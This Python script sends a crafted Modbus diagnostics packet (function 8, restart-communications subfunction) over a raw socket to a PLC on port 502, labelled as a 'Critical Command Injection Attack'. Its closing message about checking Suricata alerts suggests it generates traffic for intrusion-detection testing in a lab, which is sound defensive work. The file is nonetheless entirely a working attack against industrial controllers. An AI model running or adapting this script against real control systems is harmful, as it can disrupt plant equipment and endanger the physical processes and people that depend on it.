import socket
import struct
import time

TARGET_IP = '192.168.11.129'
TARGET_PORT = 502
UNIT_ID = 0x01

def critical_command_injection():
    print(f"[*] Launching Scenario D: Critical Command Injection Attack (Raw Socket) against {TARGET_IP}:{TARGET_PORT}")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET_IP, TARGET_PORT))
        print("[+] Perimeter breached successfully; connected to target PLC!")
        
        mbap = struct.pack('>HHHB', 1, 0, 6, UNIT_ID)
        
        pdu = struct.pack('>BHH', 8, 1, 0xFF00)
        
        packet = mbap + pdu
        
        print(f"[*] Sending crafted payload: {packet.hex()}")
        s.send(packet)
        time.sleep(0.5)
        
        try:
            response = s.recv(1024)
            if response:
                print(f"[+] Received device response: {response.hex()}")
        except socket.timeout:
            print("[-] Device timed out (device may have blocked the request or has no response mechanism).")
            
        s.close()
        print("[*] Critical command sent successfully! Please check Suricata alerts! ")
        
    except Exception as e:
        print(f"[-] Connection error occurred: {e}")

if __name__ == "__main__":
    critical_command_injection()
